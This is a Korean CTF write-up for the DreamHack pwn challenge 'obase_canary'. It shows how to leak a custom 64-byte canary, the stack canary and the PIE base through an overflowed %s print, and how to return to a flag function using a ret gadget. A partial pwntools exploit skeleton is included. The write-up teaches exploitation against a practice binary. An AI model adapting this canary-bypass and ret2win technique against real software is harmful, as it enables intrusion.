---
ctf_name: "DreamHackWargame"
challenge_name: "obase_canary"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "kjs24"
date: "2026-06-23"
points: 0
tags: [stack canary leak, PIE leak, ret2win, stack alignment]
---

# obase_canary

## 문제 설명

`obase_canary`는 일반적인 stack canary 외에도 프로그램에서 직접 만든 64바이트짜리 canary를 함께 검사하는 pwn 문제이다.

메뉴를 통해 스택 버퍼를 출력하거나 입력할 수 있고, 종료 시 직접 만든 canary가 손상되었는지 확인한 뒤 정상이라면 `main` 함수가 반환된다. 목표는 canary 검사를 우회하고 플래그 출력 함수인 `sub_158E()`로 제어 흐름을 넘기는 것이다.

## 풀이

### 보호 기법

`checksec` 결과는 다음과 같다.

```text
Arch:     amd64
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
SHSTK:    Enabled
IBT:      Enabled
Stripped: No
```

PIE와 NX가 켜져 있고 stack canary도 존재한다. 따라서 단순히 return address를 덮는 방식으로는 익스플로잇할 수 없고, canary와 PIE base를 먼저 leak해야 한다.

### main 분석

`main` 함수의 핵심 부분은 다음과 같다.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4;
  int i;
  _QWORD buf[2];
  _QWORD v7[10];

  v7[9] = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  buf[0] = 0;
  buf[1] = 0;
  memset(v7, 0, 64);
  sub_1493(v7);

  while (1) {
    sub_1542();
    __isoc99_scanf("%d", &v4);
    if (v4 == 3)
      break;

    if (v4 == 1) {
      printf("X-Ray result : %s\n", (const char *)buf);
    } else if (v4 == 2) {
      printf("Input operation : ");
      read(0, buf, 0x100u);
    }
  }

  for (i = 0; i <= 63; ++i) {
    if (*((char *)v7 + i) != my_canary[i]) {
      puts("Oh no!!! My canary is injured during operation!!!");
      exit(1);
    }
  }

  puts("Good. Now my canary, fly!");
  return 0;
}
```

`buf`는 16바이트뿐인데, 메뉴 2번에서 `read(0, buf, 0x100)`으로 0x100바이트를 입력받는다. 따라서 `buf` 뒤에 있는 `v7`, 직접 만든 canary, 실제 stack canary, saved rbp, return address까지 덮을 수 있다.

또한 메뉴 1번은 `buf`를 `%s`로 출력한다.

```c
printf("X-Ray result : %s\n", (const char *)buf);
```

입력으로 `buf`의 널 바이트를 없애면, `%s` 출력이 `buf` 뒤쪽 스택 값까지 이어진다. 이 leak을 이용해 직접 만든 64바이트 canary와 실제 stack canary, 그리고 main 주변의 코드 주소를 구할 수 있다.

### 사용자 정의 canary

`sub_1493()`은 `/dev/urandom`에서 64바이트를 읽어 전역 배열 `my_canary`에 저장하고, 같은 값을 `main`의 지역 변수 `v7`에도 복사한다.

```c
int __fastcall sub_1493(__int64 a1)
{
  FILE *stream;

  stream = fopen("/dev/urandom", "r");
  if (!stream) {
    puts("[!] Random generator error. Send DM to rootsquare...");
    exit(1);
  }

  fread(my_canary, 1u, 0x40u, stream);
  fclose(stream);

  for (int i = 0; i <= 63; ++i)
    *(_BYTE *)(a1 + i) = my_canary[i];
}
```

종료 시에는 `v7`과 `my_canary`를 비교한다. 즉, return address를 덮기 위해서는 `v7` 위치의 64바이트 값을 원래 값으로 복구해야 한다.

### Leak

스택 배치는 대략 다음과 같다.

```text
buf          : rbp - 0x60
v7           : rbp - 0x50
real canary  : rbp - 0x08
saved rbp    : rbp
return addr  : rbp + 0x08
```

먼저 메뉴 2번에서 `buf`와 `v7` 앞부분을 널 바이트 없이 채운 뒤 메뉴 1번으로 출력하면, 원래 `v7`에 들어 있던 사용자 정의 canary 값이 출력된다.

실제로 출력 결과를 보면 입력한 바이트 뒤에 랜덤한 값들이 이어져 나오며, canary 직전까지 leak되는 것을 확인할 수 있었다.

```text
N1\x14\xc8dpF\x8aD\xc5\xd8\x12s\x01\xb1...
```

그 다음에는 overflow payload를 구성할 때 leak한 64바이트 사용자 정의 canary를 그대로 `v7` 위치에 다시 써 주면 된다.

실제 stack canary도 같은 방식으로 leak할 수 있다. stack canary의 하위 1바이트는 널 바이트이므로 leak 결과를 파싱할 때 앞에 `\x00`을 붙여 8바이트 값으로 복원한다.

### PIE base 계산

처음에는 libc leak을 통해 ROP 또는 one gadget을 사용하려고 했지만, glibc 2.39 환경에서는 one gadget 제약 조건을 맞추기 까다로웠고 계속 SIGSEGV가 발생했다.

```text
0x583dc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
address rsp+0x68 is writable
rsp & 0xf == 0
rax == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid argv
rbx == NULL || (u16)[rbx] == NULL
```

이 문제는 굳이 libc ROP가 필요하지 않다. `main` 스택 프레임 바깥쪽에 `main`의 실제 주소가 남아 있었기 때문이다.

gdb에서 확인하면 다음과 같이 스택에 `main` 주소가 보인다.

```text
pwndbg> x/20gx $rbp
0x7fffffffe2d0: 0x00007fffffffe370      0x00007ffff7dce1ca
0x7fffffffe2e0: 0x00007fffffffe320      0x00007fffffffe3f8
0x7fffffffe2f0: 0x0000000155554040      0x0000555555555289
                                                    ^
                                                    main
```

IDA에서 `main`의 offset을 알고 있으므로, leak한 실제 `main` 주소에서 offset을 빼면 PIE base를 구할 수 있다.

```python
pie_base = leaked_main - main_offset
flag_func = pie_base + 0x158e
ret_gadget = pie_base + ret_offset
```

IDA에서 `sub_1493`처럼 표시되는 함수 이름은 PIE base 기준 offset이 `0x1493`인 사용자 정의 함수라는 의미이다. 마찬가지로 플래그 출력 함수 `sub_158E`의 실제 주소는 `PIE base + 0x158e`로 계산할 수 있다.

### 플래그 출력 함수

플래그 출력 함수는 다음과 같다.

```c
int sub_158E()
{
  rp = fopen("flag.txt", "rt");
  if (!rp) {
    puts("[!] Flag file error. Send DM to rootsquare...");
    exit(1);
  }

  __isoc99_fscanf(rp, "%s", flag);
  fclose(rp);
  puts("Thanks! My canary is now healthy!!!");
  return printf("I give you a flag : %s\n", flag);
}
```

따라서 최종적으로 return address를 `sub_158E`로 바꾸면 플래그를 출력할 수 있다.

### 스택 정렬 문제

처음에는 `main`의 return address에 바로 `sub_158E` 주소를 넣었다. 이 경우 `sub_158E`에는 진입했지만 내부의 `fscanf` 호출 과정에서 SIGSEGV가 발생했다.

원인은 amd64 함수 호출 규약의 스택 정렬이었다. `main`에서 `ret`으로 바로 `sub_158E`로 들어가면 일반적인 `call` 명령을 거친 함수 호출과 스택 정렬 상태가 달라진다. 그 결과 `sub_158E` 내부에서 libc 함수를 호출할 때 정렬이 맞지 않아 crash가 발생했다.

해결 방법은 바이너리 안에서 단순 `ret` 가젯을 하나 찾아 ROP chain 앞에 넣는 것이다.

```text
payload return chain:
ret gadget
sub_158E
```

즉, 최종 return address는 바로 `sub_158E`가 아니라 `ret` 가젯이 된다. `ret` 가젯을 한 번 거치면서 `rsp`가 8바이트 증가하고, 그 다음 `sub_158E`로 이동하면 스택 정렬이 맞아 `fscanf`가 정상적으로 동작한다.

## 익스플로잇

전체 exploit 흐름은 다음과 같다.

1. 메뉴 2번으로 `buf` 뒤쪽의 널 바이트를 덮는다.
2. 메뉴 1번의 `%s` 출력으로 사용자 정의 canary를 leak한다.
3. 추가 leak으로 실제 stack canary와 main 주소를 얻는다.
4. leak한 main 주소에서 PIE base를 계산한다.
5. PIE base를 이용해 `ret` 가젯과 `sub_158E`의 실제 주소를 계산한다.
6. overflow payload에 사용자 정의 canary와 실제 stack canary를 원래 값으로 복구한다.
7. return chain을 `ret; sub_158E` 형태로 구성한다.
8. 메뉴 3번으로 종료해 canary 검사를 통과하고 플래그 출력 함수로 이동한다.

payload 구조는 다음과 같다.

```text
buf padding
leaked custom canary 64 bytes
padding
real stack canary
saved rbp
ret gadget
sub_158E
```

예시 코드는 다음과 같은 형태이다.

```python
from pwn import *

context.binary = "./main"

elf = context.binary
p = process(elf.path)

main_offset = elf.symbols["main"]
win_offset = 0x158e
ret_offset = ROP(elf).find_gadget(["ret"]).address

# 1. leak custom canary, real canary, and leaked main address
# 2. parse leaked values

pie_base = leaked_main - main_offset
ret = pie_base + ret_offset
win = pie_base + win_offset

payload = b"A" * 0x10
payload += custom_canary
payload += b"B" * 0x8
payload += p64(real_canary)
payload += b"C" * 0x8
payload += p64(ret)
payload += p64(win)

# menu 2: write payload
# menu 3: exit main and trigger ret2win

p.interactive()
```

정확한 padding 길이는 gdb에서 확인한 `buf`, `v7`, real canary, saved rbp 위치를 기준으로 맞추면 된다.

## 플래그

```text
DH{REDACTED}
```

## 배운 점

이 문제에서는 main 스택 프레임 내부 leak만 보지 말고, 프레임 바깥쪽에 남아 있는 코드 포인터도 함께 확인하는 것이 중요했다. main의 실제 주소를 leak할 수 있으면 libc ROP 없이 PIE base를 구해 바이너리 내부의 플래그 출력 함수로 바로 이동할 수 있다.

또한 ret2win처럼 단순한 흐름에서도 amd64 스택 정렬을 맞추지 않으면 libc 함수 호출 시 SIGSEGV가 날 수 있다. 함수 주소로 바로 return해서 crash가 난다면, `ret` 가젯을 하나 앞에 넣어 정렬을 보정하는 방법을 먼저 확인해야 한다.
